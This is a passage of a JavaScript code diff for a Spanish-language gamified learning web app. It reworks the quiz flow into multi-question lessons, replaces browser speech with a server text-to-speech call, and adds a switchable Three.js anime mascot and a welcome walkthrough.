-fill.style.background=`linear-gradient(90deg,${CURSOS[cursoKey].color},${CURSOS[cursoKey].color2})`;
-let paso=0;
-
+fill.style.background=`linear-gradient(90deg,${CURSOS[key].color},${CURSOS[key].color2})`;
+let paso=0;respuestasCorrectas=0;
+preguntasActuales=lec.q||[];pregIdx=0;
 function mostrarPaso(){
 if(paso<lec.p.length){
-const p=lec.p[paso];
-document.getElementById('lesson-content').innerHTML=`<div class="lesson-card"><div class="lesson-title">📖 ${lec.t}</div><div class="step-title">${p.t}</div><div class="step-text">${p.c}</div><button class="lesson-btn" id="btn-next">SIGUIENTE ➤</button></div>`;
+const pp=lec.p[paso];
+document.getElementById('lesson-content').innerHTML=`<div class="lesson-card"><div class="lesson-title">📖 ${lec.t}</div><div class="step-title">${pp.t}</div><div class="step-text">${pp.c}</div><button class="lesson-btn" id="btn-next">SIGUIENTE ➤</button></div>`;
 document.getElementById('btn-next').onclick=()=>{paso++;mostrarPaso();};
-fill.style.width=((paso+1)/(lec.p.length+1)*100)+'%';
+fill.style.width=((paso+1)/(lec.p.length+preguntasActuales.length)*100)+'%';
 }else mostrarQuiz();
 }
-
 function mostrarQuiz(){
-let html=`<div class="lesson-card"><div class="lesson-title">🧠 Pon a prueba</div><div class="quiz-question">${lec.q}</div>`;
-lec.o.forEach((op,i)=>{html+=`<button class="quiz-option" data-i="${i}">${op}</button>`;});
+if(pregIdx>=preguntasActuales.length){
+fill.style.width='100%';
+const ac=respuestasCorrectas,tot=preguntasActuales.length;
+if(ac===tot){
+errores=errores.filter(e=>!(e.idx===idx&&e.curso===key));
+if(!modoRepaso && progreso[key]===idx)progreso[key]++;
+xp+=15;if(xp>=100){level++;xp-=100;}
+verificarLogros();guardarProgreso();actualizarStats();
+aquaSpeak("¡Excelente! ✨",2000);
+setTimeout(()=>{cerrarLeccion();renderPath();modoRepaso=false;},1400);
+}else{
+if(!errores.find(e=>e.idx===idx&&e.curso===key))errores.push({idx,curso:key});
+guardarProgreso();actualizarStats();
+aquaSpeak(`Acertaste ${ac}/${tot}. 😭`,2500);
+setTimeout(()=>{cerrarLeccion();modoRepaso=false;},2000);
+}
+return;
+}
+const q=preguntasActuales[pregIdx];
+let html=`<div class="lesson-card"><div class="lesson-title">🧠 Pregunta ${pregIdx+1}/${preguntasActuales.length}</div><div class="quiz-question">${q.q}</div>`;
+q.o.forEach((op,i)=>{html+=`<button class="quiz-option" data-i="${i}">${op}</button>`;});
 html+=`</div>`;
 document.getElementById('lesson-content').innerHTML=html;
-fill.style.width='90%';
+fill.style.width=((lec.p.length+pregIdx+1)/(lec.p.length+preguntasActuales.length)*100)+'%';
 document.querySelectorAll('.quiz-option').forEach(b=>{
 b.onclick=()=>{
 const i=parseInt(b.dataset.i);
 document.querySelectorAll('.quiz-option').forEach(x=>x.disabled=true);
-if(i===lec.c){
-b.classList.add('correct');
-fill.style.width='100%';
-errores=errores.filter(e=>!(e.idx===idx&&e.curso===cursoKey));
-if(!modoRepaso && progreso[cursoKey]===idx)progreso[cursoKey]++;
-xp+=15;if(xp>=100){level++;xp-=100;}
-verificarLogros();guardarProgreso();actualizarStats();
-setTimeout(()=>{cerrarLeccion();renderPath();aquaSpeak("¡Excelente! ✨",2000);modoRepaso=false;},1400);
-}else{
-b.classList.add('wrong');
-document.querySelectorAll('.quiz-option')[lec.c].classList.add('correct');
-if(!errores.find(e=>e.idx===idx&&e.curso===cursoKey))errores.push({idx,curso:cursoKey});
-guardarProgreso();actualizarStats();
-aquaSpeak("¡Ay, no! 😭",2500);
-setTimeout(()=>{cerrarLeccion();modoRepaso=false;},2000);
-}
+if(i===q.c){b.classList.add('correct');respuestasCorrectas++;}
+else{b.classList.add('wrong');document.querySelectorAll('.quiz-option')[q.c].classList.add('correct');}
+setTimeout(()=>{pregIdx++;mostrarQuiz();},1200);
 };
 });
 }
 mostrarPaso();
 }
+function cerrarLeccion(){document.getElementById('lesson-overlay').classList.remove('active');moverWaifuLeccion(false);}
 
-function cerrarLeccion(){document.getElementById('lesson-overlay').classList.remove('active');moverAquaLeccion(false);}
-
-// ============================================
 // AQUA
-// ============================================
 const aquaBubble=document.getElementById('aqua-bubble');
-function aquaSpeak(text,dur=3000){
+let currentAudio=null;
+async function aquaSpeak(text,dur=4000){
 if(!aquaVisible)return;
-aquaBubble.innerText=text;
-aquaBubble.classList.add('show');
-clearTimeout(window.bT);
-window.bT=setTimeout(()=>aquaBubble.classList.remove('show'),dur);
-const s=window.speechSynthesis;
-const u=new SpeechSynthesisUtterance(text);
-u.lang='es-ES';u.rate=1.0;u.pitch=1.4;s.cancel();s.speak(u);
+aquaBubble.innerText=text;aquaBubble.classList.add('show');
+clearTimeout(window.bT);window.bT=setTimeout(()=>aquaBubble.classList.remove('show'),dur);
+if(currentAudio){currentAudio.pause();currentAudio=null;}
+try{
+const r=await fetch('/api/tts',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({texto:text,voice_id:currentWaifu.voice})});
+if(!r.ok)return;
+const blob=await r.blob();const url=URL.createObjectURL(blob);
+currentAudio=new Audio(url);await currentAudio.play();
+currentAudio.onended=()=>{URL.revokeObjectURL(url);currentAudio=null;};
+}catch(e){console.error(e);}
 }
-function toggleAqua(){
-aquaVisible=!aquaVisible;
-document.getElementById('canvas3d').style.opacity=aquaVisible?'1':'0';
-document.getElementById('aqua-handle').style.display=aquaVisible?'block':'none';
-aquaBubble.classList.remove('show');
-const t=document.getElementById('toggle-aqua');
-t.classList.toggle('off',!aquaVisible);
-t.innerText=aquaVisible?'👁️':'🚫';
-}
+function toggleAqua(){aquaVisible=!aquaVisible;document.getElementById('canvas3d').style.opacity=aquaVisible?'1':'0';document.getElementById('aqua-handle').style.display=aquaVisible?'block':'none';aquaBubble.classList.remove('show');const t=document.getElementById('toggle-aqua');t.classList.toggle('off',!aquaVisible);t.innerText=aquaVisible?'👁️':'🚫';}
 
 let dragging=false,sX=0,sY=0,sL=0,sT=0;
 const aquaHandle=document.getElementById('aqua-handle');
 aquaHandle.addEventListener('pointerdown',e=>{dragging=true;const r=aquaHandle.getBoundingClientRect();sX=e.clientX;sY=e.clientY;sL=r.left;sT=r.top;aquaHandle.classList.add('grabbing');e.preventDefault();});
-document.addEventListener('pointermove',e=>{if(!dragging)return;const dx=e.clientX-sX,dy=e.clientY-sY;const newL=Math.max(0,Math.min(window.innerWidth-130,sL+dx));const newT=Math.max(0,Math.min(window.innerHeight-200,sT+dy));aquaHandle.style.left=newL+'px';aquaHandle.style.top=newT+'px';aquaHandle.style.right='auto';aquaHandle.style.bottom='auto';updateAqua3D(newL+65,newT+100);e.preventDefault();});
+document.addEventListener('pointermove',e=>{if(!dragging)return;const dx=e.clientX-sX,dy=e.clientY-sY;const nL=Math.max(0,Math.min(window.innerWidth-130,sL+dx));const nT=Math.max(0,Math.min(window.innerHeight-200,sT+dy));aquaHandle.style.left=nL+'px';aquaHandle.style.top=nT+'px';aquaHandle.style.right='auto';aquaHandle.style.bottom='auto';updateWaifu3D(nL+65,nT+100);e.preventDefault();});
 document.addEventListener('pointerup',()=>{dragging=false;aquaHandle.classList.remove('grabbing');});
-
-function updateAqua3D(px,py){if(!modelo3D)return;const scale=(8*Math.tan(Math.PI/8)*2)/window.innerHeight;modelo3D.position.x=(px-window.innerWidth/2)*scale;modelo3D.position.y=-(py-window.innerHeight/2)*scale+1.0;aquaBaseX=modelo3D.position.x;aquaBaseY=modelo3D.position.y;}
-
-function moverAquaLeccion(activo){
-if(!modelo3D)return;
-if(activo){
-const scale=(8*Math.tan(Math.PI/8)*2)/window.innerHeight;
-const px=80,py=window.innerHeight*0.55;
-modelo3D.position.x=(px-window.innerWidth/2)*scale;
-modelo3D.position.y=-(py-window.innerHeight/2)*scale+1.0;
-aquaBaseX=modelo3D.position.x;aquaBaseY=modelo3D.position.y;
-modelo3D.scale.set(1.6,1.6,1.6);
-}else{
-const r=aquaHandle.getBoundingClientRect();
-updateAqua3D(r.left+65,r.top+100);
-modelo3D.scale.set(1.3,1.3,1.3);
-}
-}
+function updateWaifu3D(px,py){if(!modelo3D)return;const sc=(8*Math.tan(Math.PI/8)*2)/window.innerHeight;modelo3D.position.x=(px-window.innerWidth/2)*sc;modelo3D.position.y=-(py-window.innerHeight/2)*sc+1.0;aquaBaseX=modelo3D.position.x;aquaBaseY=modelo3D.position.y;}
+function moverWaifuLeccion(a){if(!modelo3D)return;if(a){const sc=(8*Math.tan(Math.PI/8)*2)/window.innerHeight;const px=80,py=window.innerHeight*0.55;modelo3D.position.x=(px-window.innerWidth/2)*sc;modelo3D.position.y=-(py-window.innerHeight/2)*sc+1.0;aquaBaseX=modelo3D.position.x;aquaBaseY=modelo3D.position.y;}else{const r=aquaHandle.getBoundingClientRect();updateWaifu3D(r.left+65,r.top+100);}}
 
 function toggleChat(){const b=document.getElementById('chat-input-bar');const f=document.querySelector('.chat-fab');b.classList.toggle('active');f.classList.toggle('active');f.innerText=b.classList.contains('active')?'✕':'💬';}
 function handleChatKey(e){if(e.key==='Enter')sendChat();}
-async function sendChat(){
-const i=document.getElementById('chat-input');
-const t=i.value.trim();
-if(!t)return;
-i.value='';
-aquaSpeak('...',1500);
-try{
-const r=await fetch('/api/chat',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({mensaje:t})});
-const d=await r.json();
-aquaSpeak(d.respuesta,5000);
-}catch(e){aquaSpeak("Error de conexión, mortal.",3000);}
-}
+async function sendChat(){const i=document.getElementById('chat-input');const t=i.value.trim();if(!t)return;i.value='';aquaSpeak('...',1500);try{const r=await fetch('/api/chat',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({mensaje:t,waifu:currentWaifu.name})});const d=await r.json();aquaSpeak(d.respuesta,5000);}catch(e){aquaSpeak("Error de conexión.",3000);}}
 
-// ============================================
-// THREE.JS
-// ============================================
+// THREE
 const canvas=document.getElementById('canvas3d');
 const scene=new THREE.Scene();
 const camera=new THREE.PerspectiveCamera(45,window.innerWidth/window.innerHeight,.1,1000);
 camera.position.set(0,1,8);
 const renderer=new THREE.WebGLRenderer({canvas,alpha:true,antialias:true});
-renderer.setSize(window.innerWidth,window.innerHeight);
-renderer.setPixelRatio(Math.min(window.devicePixelRatio,2));
+renderer.setSize(window.innerWidth,window.innerHeight);renderer.setPixelRatio(Math.min(window.devicePixelRatio,2));
 scene.add(new THREE.AmbientLight(0xffffff,.9));
 const dl=new THREE.DirectionalLight(0xffffff,1.5);dl.position.set(2,5,5);scene.add(dl);
 const bl=new THREE.PointLight(0x1cb0f6,2,12);bl.position.set(-2,1,2);scene.add(bl);
 const pk=new THREE.PointLight(0xe94560,1,12);pk.position.set(2,0,2);scene.add(pk);
-
 let modelo3D,aquaBaseX=0,aquaBaseY=0;
-new THREE.GLTFLoader().load('/static/aqua__anime_chibi_model.glb',g=>{
-modelo3D=g.scene;
-modelo3D.scale.set(1.3,1.3,1.3);
-const r=aquaHandle.getBoundingClientRect();
-updateAqua3D(r.left+65,r.top+100);
+function cargarWaifu(w){
+if(modelo3D){scene.remove(modelo3D);modelo3D=null;}
+new THREE.GLTFLoader().load(w.model,g=>{
+modelo3D=g.scene;modelo3D.scale.set(waifuSize,waifuSize,waifuSize);
+const r=aquaHandle.getBoundingClientRect();updateWaifu3D(r.left+65,r.top+100);
 scene.add(modelo3D);
-});
-
+},undefined,e=>console.error(e));
+}
 const clock=new THREE.Clock();
 function animate(){requestAnimationFrame(animate);if(modelo3D&&!dragging){modelo3D.position.y=aquaBaseY+Math.sin(clock.getElapsedTime()*2)*.05;}renderer.render(scene,camera);}
 animate();
 window.addEventListener('resize',()=>{camera.aspect=window.innerWidth/window.innerHeight;camera.updateProjectionMatrix();renderer.setSize(window.innerWidth,window.innerHeight);});
+
+// BIENVENIDA
+function mostrarBienvenida(){welcomePaso=0;const el=document.getElementById('welcome-overlay');el.style.display='flex';el.classList.add('active');renderWelcome();}
+function renderWelcome(){const p=WELCOME_STEPS[welcomePaso];const c=document.getElementById('welcome-card');const pr=document.getElementById('welcome-progress');document.getElementById('welcome-sub').innerText=welcomePaso===0?"Tu aventura comienza":"";pr.innerHTML='';WELCOME_STEPS.forEach((_,i)=>{const d=document.createElement('div');d.className='welcome-dot'+(i===welcomePaso?' active':'');pr.appendChild(d);});c.innerHTML=`<div class="welcome-step"><div class="icon">${p.icon}</div><div class="text"><strong>${p.title}</strong>${p.text}</div></div>`;document.querySelector('.welcome-btn').innerText=welcomePaso===WELCOME_STEPS.length-1?"¡EMPEZAR! 🚀":"SIGUIENTE ➤";}
+function welcomeNext(){if(welcomePaso<WELCOME_STEPS.length-1){welcomePaso++;renderWelcome();}else{const el=document.getElementById('welcome-overlay');el.classList.remove('active');el.style.display='none';aquaSpeak("¡Bienvenido! 😏",4000);}}
 
 setInterval(()=>{calcularEnergia();actualizarStats();},30000);
 renderPath();
